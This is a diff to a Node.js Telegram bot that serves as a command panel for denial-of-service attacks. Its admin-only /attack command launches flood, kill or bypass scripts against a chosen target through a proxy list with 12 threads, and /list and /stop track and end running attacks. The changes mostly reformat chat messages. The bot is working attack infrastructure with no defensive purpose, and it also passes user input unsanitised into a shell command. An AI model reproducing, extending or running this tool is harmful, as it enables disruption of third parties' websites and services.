@@ -12,14 +12,14 @@ const bot = new TelegramBot(token, { polling: true })
 let attacks = []
 
 app.get('/', (req, res) => {
-  res.json({ telegramAdmin: '@xkprj', status: 'Bot đang hoạt động' })
+  res.json({ telegramAdmin: '@xkprj', status: 'Bot is running' })
 })
 
 app.listen(port)
 
 bot.onText(/^\/system$/, async (msg) => {
   if (msg.from.id.toString() !== adminId) {
-    return bot.sendMessage(msg.chat.id, 'Access denied')
+    return bot.sendMessage(msg.chat.id, 'Access denied', { parse_mode: 'Markdown' })
   }
   try {
     const data = await si.get({
@@ -33,45 +33,25 @@ bot.onText(/^\/system$/, async (msg) => {
       if (bytes >= 1048576) return `${(bytes / 1048576).toFixed(2)} MB`
       return `${bytes} B`
     }
-    bot.sendMessage(msg.chat.id, '```json\n' + JSON.stringify({
-      cpu: {
-        manufacturer: data.cpu.manufacturer,
-        brand: data.cpu.brand,
-        speed: data.cpu.speed,
-        cores: data.cpu.cores
-      },
-      memory: {
-        total: formatBytes(data.mem.total),
-        free: formatBytes(data.mem.free),
-        used: formatBytes(data.mem.used)
-      },
-      disk: data.fsSize.map(d => ({
-        fs: d.fs,
-        size: formatBytes(d.size),
-        used: formatBytes(d.used),
-        available: formatBytes(d.available)
-      })),
-      os: {
-        platform: data.osInfo.platform,
-        distro: data.osInfo.distro,
-        release: data.osInfo.release
-      }
-    }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+    bot.sendMessage(msg.chat.id, `*CPU*: ${data.cpu.manufacturer} ${data.cpu.brand}, ${data.cpu.speed} GHz, ${data.cpu.cores} cores\n` +
+      `*Memory*: Total: ${formatBytes(data.mem.total)}, Free: ${formatBytes(data.mem.free)}, Used: ${formatBytes(data.mem.used)}\n` +
+      `*Disk*: ${data.fsSize.map(d => `${d.fs}: Size ${formatBytes(d.size)}, Used ${formatBytes(d.used)}, Available ${formatBytes(d.available)}`).join('\n')}\n` +
+      `*OS*: ${data.osInfo.platform}, ${data.osInfo.distro}, ${data.osInfo.release}`, { parse_mode: 'Markdown' })
   } catch (error) {
-    bot.sendMessage(msg.chat.id, `Error fetching system info: ${error.message}`)
+    bot.sendMessage(msg.chat.id, `Error fetching system info: ${error.message}`, { parse_mode: 'Markdown' })
   }
 })
 
 bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
   if (msg.from.id.toString() !== adminId) {
-    return bot.sendMessage(msg.chat.id, 'Access denied')
+    return bot.sendMessage(msg.chat.id, 'Access denied', { parse_mode: 'Markdown' })
   }
   if (!match[1]) {
-    return bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
+    return bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]', { parse_mode: 'Markdown' })
   }
   const params = match[1].trim().split(/\s+/)
   if (params.length < 2) {
-    return bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
+    return bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]', { parse_mode: 'Markdown' })
   }
   const method = ['flood', 'kill', 'bypass'].includes(params[0]) ? params[0] : 'flood'
   const target = params.length === 3 ? params[1] : params[0]
@@ -80,7 +60,7 @@ bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
   const threads = 12
   const proxyfile = './prx.txt'
   if (!target || isNaN(time) || time <= 0) {
-    return bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
+    return bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]', { parse_mode: 'Markdown' })
   }
   const attackId = Date.now()
   const attackData = {
@@ -90,120 +70,66 @@ bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
     rate,
     threads,
     proxyfile,
-    status: 'started',
-    messageId: null,
     pid: null
   }
   try {
-    const sentMsg = await bot.sendMessage(msg.chat.id, '```json\n' + JSON.stringify({
-      status: attackData.status,
-      target,
-      time,
-      rate,
-      threads,
-      proxyfile
-    }, null, 2) + '\n```', { parse_mode: 'Markdown' })
-    attackData.messageId = sentMsg.message_id
     attacks.push(attackData)
     const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`)
     child.on('spawn', () => {
       attackData.pid = child.pid
-      attackData.status = 'running'
-      let remainingTime = time
-      const interval = setInterval(async () => {
-        remainingTime -= 5
-        if (remainingTime <= 0 || !attacks.find(a => a.id === attackId)) {
-          clearInterval(interval)
-          try {
-            if (attackData.messageId) {
-              await bot.deleteMessage(msg.chat.id, attackData.messageId)
-            }
-            attacks = attacks.filter(a => a.id !== attackId)
-          } catch (error) {
-            console.error(`Error cleaning up attack ${attackId}: ${error.message}`)
-          }
-          return
-        }
-        try {
-          await bot.editMessageText('```json\n' + JSON.stringify({
-            status: attackData.status,
-            target,
-            time: remainingTime,
-            rate,
-            threads,
-            proxyfile
-          }, null, 2) + '\n```', {
-            chat_id: msg.chat.id,
-            message_id: attackData.messageId,
-            parse_mode: 'Markdown'
-          })
-        } catch (error) {
-          clearInterval(interval)
-          attacks = attacks.filter(a => a.id !== attackId)
-          console.error(`Error updating message for attack ${attackId}: ${error.message}`)
-        }
-      }, 5000)
     })
     child.on('error', (error) => {
-      bot.sendMessage(msg.chat.id, `Child process error: ${error.message}`)
+      bot.sendMessage(msg.chat.id, `Child process error: ${error.message}`, { parse_mode: 'Markdown' })
       attacks = attacks.filter(a => a.id !== attackId)
-      if (attackData.messageId) {
-        bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
-      }
     })
     child.on('exit', (code, signal) => {
       if (code === 0) {
-        bot.sendMessage(msg.chat.id, `Attack ${target} completed successfully`)
+        bot.sendMessage(msg.chat.id, `🔴 *Attack Launched*\n\n` +
+          `*Method*: ${method}\n` +
+          `*Target*: ${target}\n` +
+          `*Time*: ${time}s`, { parse_mode: 'Markdown' })
+        bot.sendMessage(msg.chat.id, `✅ Attack ${target} completed successfully`, { parse_mode: 'Markdown' })
       } else {
-        bot.sendMessage(msg.chat.id, `Attack failed with code ${code || signal}`)
+        bot.sendMessage(msg.chat.id, `Attack failed with code ${code || signal}`, { parse_mode: 'Markdown' })
       }
       attacks = attacks.filter(a => a.id !== attackId)
-      if (attackData.messageId) {
-        bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
-      }
     })
-    bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`)
+    bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`, { parse_mode: 'Markdown' })
   } catch (error) {
-    bot.sendMessage(msg.chat.id, `Error starting attack: ${error.message}`)
+    bot.sendMessage(msg.chat.id, `Error starting attack: ${error.message}`, { parse_mode: 'Markdown' })
     attacks = attacks.filter(a => a.id !== attackId)
-    if (attackData.messageId) {
-      bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
-    }
   }
 })
 
 bot.onText(/^\/list$/, (msg) => {
   if (msg.from.id.toString() !== adminId) {
-    return bot.sendMessage(msg.chat.id, 'Access denied')
+    return bot.sendMessage(msg.chat.id, 'Access denied', { parse_mode: 'Markdown' })
   }
   if (attacks.length === 0) {
-    return bot.sendMessage(msg.chat.id, 'No active attacks')
+    return bot.sendMessage(msg.chat.id, 'No active attacks', { parse_mode: 'Markdown' })
   }
-  const attackList = attacks.map(a => `ID: ${a.id}, Target: ${a.target}, Time: ${a.time}s`).join('\n')
-  bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`)
+  const attackList = attacks.map(a => `*ID*: ${a.id}, *Target*: ${a.target}, *Time*: ${a.time}s`).join('\n')
+  bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`, { parse_mode: 'Markdown' })
 })
 
 bot.onText(/^\/stop(?:\s(.+))?/, (msg, match) => {
   if (msg.from.id.toString() !== adminId) {
-    return bot.sendMessage(msg.chat.id, 'Access denied')
+    return bot.sendMessage(msg.chat.id, 'Access denied', { parse_mode: 'Markdown' })
   }
   if (!match[1] || isNaN(parseInt(match[1]))) {
-    return bot.sendMessage(msg.chat.id, 'Usage: /stop [attack_id]')
+    return bot.sendMessage(msg.chat.id, 'Usage: /stop [attack_id]', { parse_mode: 'Markdown' })
   }
   const attackId = parseInt(match[1])
   const attack = attacks.find(a => a.id === attackId)
   if (!attack) {
-    return bot.sendMessage(msg.chat.id, 'Attack not found')
+    return bot.sendMessage(msg.chat.id, 'Attack not found', { parse_mode: 'Markdown' })
   }
   try {
     process.kill(attack.pid, 'SIGTERM')
     attacks = attacks.filter(a => a.id !== attackId)
-    if (attack.messageId) {
-      bot.deleteMessage(msg.chat.id, attack.messageId).catch(() => {})
-    }
-    bot.sendMessage(msg.chat.id, `Attack ${attackId} stopped`)
+    bot.sendMessage(msg.chat.id, `🛑 Attack ${attackId} stopped`, { parse_mode: 'Markdown' })
   } catch (error) {
-    bot.sendMessage(msg.chat.id, `Error stopping attack: ${error.message}`)
+    bot.sendMessage(msg.chat.id, `Error stopping attack: ${error.message}`, { parse_mode: 'Markdown' })
     attacks = attacks.filter(a => a.id !== attackId)
   }
 })
